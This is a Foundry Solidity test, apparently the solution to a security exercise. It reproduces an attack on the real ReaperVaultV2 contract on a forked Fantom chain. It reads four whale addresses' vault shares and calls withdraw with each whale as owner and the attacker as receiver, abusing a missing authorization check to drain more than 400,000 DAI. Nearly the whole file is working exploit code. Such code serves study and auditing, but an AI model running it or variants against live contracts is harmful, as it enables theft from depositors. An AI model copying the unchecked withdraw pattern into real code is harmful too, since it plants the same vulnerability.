// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/ReaperVaultV2.sol";

interface IERC20Like {
    function balanceOf(address _addr) external view returns (uint256);
}

contract ReaperHack is Test {
    ReaperVaultV2 reaper =
        ReaperVaultV2(0x77dc33dC0278d21398cb9b16CbFf99c1B712a87A);
    IERC20Like fantomDai =
        IERC20Like(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E);

    address whale1 = 0xEB7a12fE169C98748EB20CE8286EAcCF4876643b;
    address whale2 = 0xfc83DA727034a487f031dA33D55b4664ba312f1D;
    address whale3 = 0x056abd53a55C187d738B4A982D36b4dFa506326A;
    address whale4 = 0x954773dD09a0bd708D3C03A62FB0947e8078fCf9;

    function testReaperHack() public {
        vm.createSelectFork(vm.envString("FANTOM_RPC"), 44000000);
        console.log(
            "Your Starting Balance:",
            fantomDai.balanceOf(address(this))
        );

        // INSERT EXPLOIT HERE
        uint256 whale1Balance = reaper.balanceOf(whale1);
        console2.log("whale1 shares: %d rfDAI", whale1Balance / 10**18);
        uint256 whale2Balance = reaper.balanceOf(whale2);
        console2.log("whale2 shares: %d rfDAI", whale2Balance / 10**18);
        uint256 whale3Balance = reaper.balanceOf(whale3);
        console2.log("whale3 shares: %d rfDAI", whale3Balance / 10**18);
        uint256 whale4Balance = reaper.balanceOf(whale4);
        console2.log("whale4 shares: %d rfDAI", whale4Balance / 10**18);

        reaper.withdraw(whale1Balance, address(this), whale1);
        reaper.withdraw(whale2Balance, address(this), whale2);
        reaper.withdraw(whale3Balance, address(this), whale3);
        reaper.withdraw(whale4Balance, address(this), whale4);

        console.log(
            "Your Final Balance:",
            fantomDai.balanceOf(address(this)) / 10**18
        );
        assert(fantomDai.balanceOf(address(this)) > 400_000 ether);
    }
}
